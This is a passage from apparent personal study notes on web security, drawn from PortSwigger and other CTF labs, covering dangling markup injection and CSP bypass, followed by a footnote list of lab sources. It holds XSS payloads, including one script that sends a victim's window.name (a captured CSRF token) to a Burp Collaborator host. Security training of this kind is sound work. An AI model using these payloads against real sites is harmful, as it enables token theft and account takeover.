<span class="hljs-title function_">fetchUrl</span>(<span class="hljs-string">"http://$ip"</span>);
&lt;/script&gt;</code></pre></div>
<p><sup class="jop-noMdConv"><a title="#fn37" href="#fn37">[37]</a></sup></p>
<h2 id="dangling-markup-injection">Dangling Markup Injection</h2>
<p><strong>option script 1</strong></p>
<div><pre class="hljs"><code>    &lt;script&gt;
    location=<span class="hljs-string">'https://your-lab-id.web-security-academy.net/my-account?email="&gt;&lt;table background='</span><span class="hljs-comment">//your-collaborator-id.burpcollaborator.net?';</span>
    &lt;/script&gt;</code></pre></div>
<p>this will GET to collabolator i.e. to get csrf token: <img src="/_resources/fed5f854da984feeba17c6d9b1e0990c.png" />
<sup class="jop-noMdConv"><a title="#fn38" href="#fn38">[38]</a></sup></p>
<p><strong>option script 2</strong></p>
<div><pre class="hljs"><code>    &lt;script&gt;
    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">name</span>) {
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>().<span class="hljs-property">src</span>=<span class="hljs-string">'//your-collaborator-id.burpcollaborator.net?'</span>+<span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">name</span>);
        } <span class="hljs-keyword">else</span> {
            location = <span class="hljs-string">'https://your-lab-id.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://your-exploit-server-id.web-security-academy.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27'</span>;
    }
    &lt;/script&gt;</code></pre></div>
<p><sup class="jop-noMdConv"><a title="#fn39" href="#fn39">[39]</a></sup></p>
<h2 id="csp">CSP</h2>
<p>(1)
injection uses the script-src-elem directive in CSP. This directive allows you to target just script elements. Using this directive, you can overwrite existing script-src rules enabling you to inject unsafe-inline, which allows you to use inline scripts.
<sup class="jop-noMdConv"><a title="#fn40" href="#fn40">[40]</a></sup>
(2)
in exploit server:
<img src="/_resources/a25d7994036d4bc488ca4509a6453cb9.png" />
<sup class="jop-noMdConv"><a title="#fn41" href="#fn41">[41]</a></sup></p>
<hr />
<ol>
<li>
<p>ctf - portswigger web security - Reflected XSS into HTML context with most tags and attributes blocked <a title="#fnref1" href="#fnref1">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Reflected XSS into HTML context with all tags blocked except custom ones <a title="#fnref2" href="#fnref2">↩︎</a></p>
</li>
<li>
<p><a title="https://security.stackexchange.com/questions/120990/bypass-char-filtering-security-shephard" href="https://security.stackexchange.com/questions/120990/bypass-char-filtering-security-shephard">https://security.stackexchange.com/questions/120990/bypass-char-filtering-security-shephard</a> <a title="#fnref3" href="#fnref3">↩︎</a></p>
</li>
<li>
<p><a title="https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt" href="https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt">https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt</a> <a title="#fnref4" href="#fnref4">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Reflected XSS with event handlers and href attributes blocked <a title="#fnref5" href="#fnref5">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Reflected XSS with some SVG markup allowed <a title="#fnref6" href="#fnref6">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Reflected XSS into attribute with angle brackets HTML-encoded <a title="#fnref7" href="#fnref7">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Reflected XSS in canonical link tag <a title="#fnref8" href="#fnref8">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Reflected XSS into a JavaScript string with single quote and backslash escaped <a title="#fnref9" href="#fnref9">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Reflected XSS into a JavaScript string with angle brackets HTML encoded <a title="#fnref10" href="#fnref10">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped <a title="#fnref11" href="#fnref11">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped <a title="#fnref12" href="#fnref12">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Lab: Reflected XSS with AngularJS sandbox escape without strings <a title="#fnref13" href="#fnref13">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Lab: Reflected XSS with AngularJS sandbox escape and CSP <a title="#fnref14" href="#fnref14">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped <a title="#fnref15" href="#fnref15">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Stored XSS into anchor href attribute with double quotes HTML-encoded <a title="#fnref16" href="#fnref16">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - DOM XSS in document.write sink using source <a title="#fnref17" href="#fnref17">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - DOM XSS in document.write sink using source location.search inside a select element <a title="#fnref18" href="#fnref18">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - DOM XSS in innerHTML sink using source location.search <a title="#fnref19" href="#fnref19">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - DOM XSS in jQuery anchor href attribute sink using location.search source <a title="#fnref20" href="#fnref20">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded <a title="#fnref21" href="#fnref21">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Reflected DOM XSS <a title="#fnref22" href="#fnref22">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Stored DOM XSS <a title="#fnref23" href="#fnref23">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Lab: DOM XSS in jQuery selector sink using a hashchange event <a title="#fnref24" href="#fnref24">↩︎</a></p>
</li>
<li>
<p><a title="https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec#file-xxsfilterbypass-lst-L98" href="https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec#file-xxsfilterbypass-lst-L98">https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec#file-xxsfilterbypass-lst-L98</a> <a title="#fnref25" href="#fnref25">↩︎</a></p>
</li>
<li>
<p>ctf - pentesterlab - web-for-pentester.docx <a title="#fnref26" href="#fnref26">↩︎</a></p>
</li>
<li>
<p><a title="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a> <a title="#fnref27" href="#fnref27">↩︎</a></p>
</li>
<li>
<p>ctf - “portswiger - web security.docx” - “web cache poisoning” - Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria" <a title="#fnref28" href="#fnref28">↩︎</a></p>
</li>
<li>
<p>ctf - “portswiger - web security.docx” - “web cache poisoning” - “Lab: Combining web cache poisoning vulnerabilities” <a title="#fnref29" href="#fnref29">↩︎</a></p>
</li>
<li>
<p>ctf - thm - comptia pentest+ - owasp-top-10 <a title="#fnref30" href="#fnref30">↩︎</a></p>
</li>
<li>
<p>ctf - “portswigger web security” - “Cross-origin resource sharing (CORS)” - “Lab: CORS vulnerability with internal network pivot attack” <a title="#fnref31" href="#fnref31">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Exploiting cross-site scripting to steal cookies <a title="#fnref32" href="#fnref32">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Offline password cracking <a title="#fnref33" href="#fnref33">↩︎</a></p>
</li>
<li>
<p>ctf - htb - bankrobber <a title="#fnref34" href="#fnref34">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Exploiting cross-site scripting to capture passwords <a title="#fnref35" href="#fnref35">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Exploiting XSS to perform CSRF <a title="#fnref36" href="#fnref36">↩︎</a></p>
</li>
<li>
<p>ctf - “portswigger web security” - “Cross-origin resource sharing (CORS)” - “Lab: CORS vulnerability with internal network pivot attack” <a title="#fnref37" href="#fnref37">↩︎</a></p>
</li>
<li>
<p><a title="https://portswigger.net/web-security/cross-site-scripting/dangling-markup" href="https://portswigger.net/web-security/cross-site-scripting/dangling-markup">https://portswigger.net/web-security/cross-site-scripting/dangling-markup</a> <a title="#fnref38" href="#fnref38">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Reflected XSS protected by CSP, with dangling markup attack <a title="#fnref39" href="#fnref39">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Lab: Reflected XSS protected by CSP, with CSP bypass <a title="#fnref40" href="#fnref40">↩︎</a></p>
</li>
<li>
<p>ctf - portswigger web security - Lab: Reflected XSS protected by very strict CSP, with dangling markup attack <a title="#fnref41" href="#fnref41">↩︎</a></p>
</li>
</ol>
]]></content:encoded>
        </item>
    </channel>
</rss>